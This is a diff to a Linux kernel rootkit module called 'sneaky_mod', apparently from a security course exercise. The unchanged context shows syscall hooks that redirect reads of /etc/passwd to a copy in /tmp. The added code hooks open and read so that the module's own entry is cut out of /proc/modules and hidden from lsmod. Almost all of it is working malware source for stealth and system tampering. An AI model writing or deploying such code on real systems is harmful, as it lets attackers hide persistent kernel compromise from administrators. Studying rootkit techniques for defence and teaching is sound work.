@@ -88,8 +88,10 @@ unsigned short bpos;
 // open
 const char *passwd_path = "/etc/passwd";
 const char *tmp_path = "/tmp/passwd";
+const char *lsmod = "/proc/modules";
 
 // read
+static int lsmod_open = 0;
 const char *sneaky_mod = "sneaky_mod";
 ssize_t nread_read;
 /*-----------------------------------------------------------------*/
@@ -100,6 +102,32 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
   nread_read = original_read_call(fd, buf, count);
   if (nread_read <= 0) {
     return nread_read;
+  }
+
+  if (lsmod_open) {
+    // find sneaky_mod
+    void *sneaky_start = strstr(buf, sneaky_mod);
+    if (sneaky_start == NULL) {
+      lsmod_open = 0;
+      return nread_read; // sneaky_mod not found
+    }
+
+    void *src = strchr((char *)sneaky_start, '\n');
+    //    printk_ratelimited(KERN_INFO "Read: after sneaky_mod: %s\n", (char
+    //    *)src);
+    src += 1;
+    //    printk_ratelimited(KERN_INFO "Read: after new_line: %s\n", (char
+    //    *)src);
+
+    /* size_t copy_size = buf + nread_read - src; */
+    /* printk_ratelimited(KERN_INFO "Read: copy_size: %lu, strlen(src): %lu\n",
+     */
+    /*                    copy_size, strlen((char *)src)); */
+
+    memmove(sneaky_start, src, strlen((char *)src));
+    nread_read -= (src - sneaky_start);
+
+    lsmod_open = 0;
   }
 
   return nread_read;
@@ -148,6 +176,10 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
     copy_to_user((char *)pathname, tmp_path, strlen(tmp_path));
     printk_ratelimited(KERN_INFO "Sneaky Open: User Space path - %s\n",
                        pathname);
+  }
+
+  if (!(strcmp(pathname, lsmod))) {
+    lsmod_open = 1;
   }
 
   return original_open_call((const char *)pathname, flags);
